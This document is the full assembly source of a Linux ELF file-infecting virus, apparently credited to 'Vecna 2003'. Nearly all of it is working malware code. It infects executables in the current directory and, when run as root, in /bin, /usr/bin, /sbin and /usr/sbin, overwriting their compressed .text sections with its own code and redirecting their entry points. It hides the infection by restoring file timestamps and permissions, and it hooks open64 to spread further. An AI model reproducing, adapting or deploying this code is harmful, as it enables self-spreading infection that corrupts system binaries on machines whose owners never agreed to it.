   ;LINUX ELF PER-PROCESS/DIRECT ACTION STEALTH INFECTOR
   ;(c) Vecna 2003

   BITS 32

   %include "elf.i"
   %include "useful.i"
   %include "syscall.i"

   %include "header.i"

   %define by byte
   %define wo word
   %define dwo dword

   %define jmps jmp short



   _start:
          pushad
          mov eax, virus_size
          mov ecx, eax
          call malloc

          call delta
          rep movsb

          sub edi, virus_size-(.heapcode-_start)
          jmp edi

     .heapcode:
          sub ebx, ebx
          sub ecx, ecx
          push by __NR_clone
          pop eax
          int 80h
          test eax, eax
          jnz .restore

          call infect_dir
          push by __NR_exit
          pop eax
          int 80h

    .restore:
          mov esi, hostcode
    .packstart equ $-4
          mov eax, [esi]
          call malloc

          mov ebx, esi
          mov ebp, edi
          mov ecx, [esi]
          repe movsb

          mov esi, ebp
          mov edi, ebx
          mov ecx, [esi+4]
          mov eax, 0FFFh
          add ecx, eax
          add ecx, eax
          not eax
          and ecx, eax
          and ebx, eax
          push by 3
          pop edx
          push by __NR_mprotect
          pop eax
          pushad
          int 80h

          call z_decode

          popad
          push by 5
          pop edx
          int 80h

          call plt

          popad
          push hostcode
     .entry equ $-4
          ret



   plt:
          mov ebx, origin
     .imagebase equ $-4

          mov esi, [ebx+eh_sh_offset]
          add esi, ebx
          movzx ebp, wo [ebx+eh_sh_str_index]
          movzx eax, wo [ebx+eh_sh_entrysize]
          imul ebp
          mov ebp, [eax+esi+sh_offset]
          add ebp, ebx                     ;ebp==string table


          call .label1
          db '.plt',0
     .label1:
          call find_section
          inc edx
          jz .je2exit
          dec edx

          mov esi, [edx+sh_offset]
          add esi, ebx
          mov ecx, [edx+sh_size]

          call .label2
          db '.rel.plt',0
     .label2:
          call find_section
          inc edx
          jz .je2exit
          dec edx

          mov edi, [edx+sh_offset]
          add edi, ebx

          call .label3
          db '.dynstr',0
     .label3:
          call find_section
          inc edx
          jz .je2exit
          dec edx

          mov eax, [edx+sh_offset]
          add eax, ebx
          push eax

          call .label4
          db '.dynsym',0
     .label4:
          call find_section
          inc edx
     .je2exit
   :
          jz .exit
          dec edx

          mov edx, [edx+sh_offset]
          add edx, ebx

          pop ebp

     .plt_loop:
          add esi,by 10h
          sub ecx,by 10h
          jz .exit

          mov eax,[esi+7]
          mov eax,[edi+eax+4]
          shr eax, 4
          add eax,edx          ;eax=symbol entry

          mov eax,[eax+st_name]
          add eax,ebp          ;eax=symbol name

          push eax
          call .label5
          db "open64",0
     .label5:
          call strcmp
          test eax,eax
          jnz .plt_loop

     .found_plt_entry:
          mov eax, [esi+2]
          call delta
          lea ecx,[esi+(my_hook-_start)]
          xchg [eax],ecx
          mov [esi+(old_hook-_start)],ecx
          mov [esi+(old_hook_ptr-_start)],eax

     .exit:
          ret



   my_hook:
          pushad
          call delta
          lea eax, [esi+(.continue-_start)]
          xchg [esp+_Pushad],eax
          mov [esi+(retadd-_start)],eax

          mov ebx,[esp+_Pushad+param1]
          call
   infect

          popad

          push dwo 0
     old_hook equ $-4
          ret

     .continue:
          pushad
          mov eax,12345678h
     old_hook_ptr equ $-4
          call delta
          lea ecx,[esi+(my_hook-_start)]
          cmp [eax],ecx
          je .done
          xchg [eax],ecx
          mov [esi+(old_hook-_start)],ecx
     .done:
          popad

          push dwo 0
     retadd equ $-4
          ret



   delta:
          call .delta
     .delta:
          pop esi
          sub esi,(.delta-_start)
          ret



   malloc:
          pushad
          push by __NR_brk
          pop eax
          sub ebx, ebx
          int 80h


          mov [esp+_Pushad_edi],eax
          add eax,[esp+_Pushad_eax]

          push by __NR_brk
          pop ebx
          xchg eax, ebx
          int 80h

          popad
          ret



   %include "z_decode.i
   "
   %include "z_encode.i
   "



   infect_dir:
          push by __NR_getuid
          pop eax
          int 80h
          test eax, eax
               ;is root?
          jnz .scandir

          call .scandir

          call .skip_dir
          db "/bin",0
     .skip_dir:
          pop ebx
          call .change_dir

          call .skip_dir2
          db "/usr/bin",0
     .skip_dir2:
          pop ebx
          call .change_dir

          call .skip_dir3
          db "/sbin",0
     .skip_dir3:
          pop ebx
          call .change_dir

          call .skip_dir4
          db "/usr/sbin",0
     .skip_dir4:
          pop ebx

     .change_dir:
          push by __NR_chdir
          pop eax
          int 80h

     .scandir:
          pushad
          sub esp, sizeof_dirent

          call .label1
          db '.',0

     .label1:
          pop ebx
          push by __NR_open
          pop eax
          cdq
          int 80h
          test eax, eax
          js  .exit

          xchg eax, ebx

     .find_next:
          push by __NR_readdir
          pop eax
          mov ecx, esp
          int 80h
          test eax, eax
          jz .exit

          push ebx

          lea ebx, [esp+dirent_name+_Push]
           ;name
          movzx eax, wo [esp+dirent_reclen+_Push]
       ;name size
          mov by [ebx+eax+1], 0

          call
   infect

          pop ebx
          jmps .find_next

     .exit:
          add esp, sizeof_dirent
          popad
          ret




   infect:
          pushad
          sub esp, by sizeof_stat

          push by __NR_stat
          pop eax
          mov ecx, esp
          int 80h

          push by __NR_open
          pop eax
          cdq
          push by 2
          pop ecx
          int 80h
          test eax, eax
          js .exit

          xchg esi, ebx            ;esi=name
          xchg eax, ebx

          movzx ecx, wo [esp+stat_mode]
          or cl, 0B6h
          push by __NR_fchmod
          pop eax
          int 80h

          push by 0
          push ebx
          push by 1
          push by 3
          push dwo [esp+stat_size+(_Push*4)]
          push by 0
          mov edi, esp

          xchg ebx,edi         ;edi=handle

          push by __NR_mmap
          pop eax
          int 80h
          add esp, by (6*_Push)

          cmp eax, 0FFFFF000h
          ja .cant_map

          xchg eax, ebx
               ;ebx=map

          call insert

          push by __NR_munmap
          pop eax
          mov ecx, [esp+stat_size]
          int 80h

     .cant_map:
          push by __NR_close
          pop eax
          xchg ebx,edi
          int 80h

          xchg ebx,esi
          movzx ecx, wo [esp+stat_mode]
          push by __NR_chmod
          pop eax
          int 80h

          push dwo [esp+stat_atime]
          push dwo [esp+stat_mtime+_Push]
          mov ecx, esp
          push by __NR_utime
          pop eax
          int 80h
          pop eax
          pop eax

     .exit:
          add esp, by sizeof_stat
          popad
          ret



   insert:
          pushad

          cmp dwo [ebx+eh_ident], 464c457fh
          jne .jne2exit
          cmp by [ebx+eh_ident+15], "!"
          je .je2exit
          cmp dwo [ebx+eh_type],00030002h      ;EM_386
   +ET_EXEC
          jne .jne2exit
          cmp wo [ebx+eh_eh_size],sizeof_elf_header
     .jne2exit:
          jne near .exit

          mov esi, [ebx+eh_sh_offset]
          test esi, esi
          jz .je2exit
          add esi, ebx

          movzx ebp, wo [ebx+eh_sh_str_index]
          test ebp, ebp
          jz .je2exit
          movzx eax, wo [ebx+eh_sh_entrysize]
          imul ebp
          mov ebp, [eax+esi+sh_offset]
          add ebp, ebx                     ;ebp==string table

          call .label1
          db ".text",0
     .label1:
          call find_section

          inc edx
     .je2exit:
          jz near .exit
          dec edx

          mov esi, [edx+sh_offset]
          add esi, ebx
          mov ecx, [edx+sh_size]

          cmp ecx, 256*1024
          ja .exit

          mov eax, ecx
          call malloc
          call z_encode
          xchg esi, edi
          mov ecx, [esi]

          lea eax, [ecx+virus_size+16]
          sub eax, [edx+sh_size]
          jnb .exit2

          mov eax, edi
          repe movsb
          movzx ecx, wo [ebx+eh_ph_entrysize]
          mov esi, [ebx+eh_ph_offset]
          add esi, ebx

     .searchimagebase:
          cmp by [esi+ph_type], 1                     ;PT_LOAD
          jz .foundimagebase
          add esi, ecx
          jmps .searchimagebase
     .foundimagebase:
          mov ecx, [esi+ph_address]
          push ecx

          sub eax, ebx
          add eax, ecx
          add ecx, edi
          sub ecx, ebx
          push ecx
          mov ecx, virus_size

          call delta
          repe movsb

          push dwo [ebx+eh_entrypoint]
          mov [edi-virus_size+(_start.packstart-_start)], eax
          pop dwo [edi-virus_size+(_start.entry-_start)]
          pop dwo [ebx+eh_entrypoint]
          pop dwo [edi-virus_size+(plt.imagebase-_start)]

          mov by [ebx+eh_ident+0Fh], "!"
          mov ebx, esp

     .exit2:
          mov eax, [edx+sh_size]
          neg eax
          call malloc

     .exit:
          cmp esp, ebx
          popad
          ret



   find_section:
                       ;return edx=section header
          pushad

          movzx edx, wo [ebx+eh_sh_count]
          movzx ecx, wo [ebx+eh_sh_entrysize]
          mov esi, [ebx+eh_sh_offset]
          add esi, ebx

     .nextsection:
          mov eax, [esi+sh_name]
          push esi

          add eax,ebp
          push dwo [esp+_Pushad+_Push+param1]
          push eax

          call strcmp
          test eax,eax
          jz .done

          pop esi
          add esi,ecx
          dec edx
          jns .nextsection

          push edx
     .done:
          pop dwo [esp+_Pushad_edx
   ]
          popad
          ret
    _Push



   strcmp:
          push by 1
          pop eax
          pushad

          mov esi,dwo [esp+_Pushad+param1]
          mov edi,dwo [esp+_Pushad+param2]

          push edi
          call strlen
          mov ecx,eax

          push esi
          call strlen

          xor eax,ecx
          jnz .error

          repe cmpsb
          jne .error

          mov [esp+_Pushad_eax],ecx
     .error:
          popad
          ret _Push*2



   strlen:
          pushad
          sub ecx,ecx
          mov esi,dwo [esp+_Pushad+param1]
     .count:
          lodsb
          test al,al
          jz .done
          inc ecx
          jmps .count
     .done:
          mov [esp+_Pushad_eax],ecx
          popad
          ret _Push



   virus_size equ $-_start



   hostcode:
   incbin "exit.bin"



   filesize equ $
    - $$

   memsize  equ $ - origin
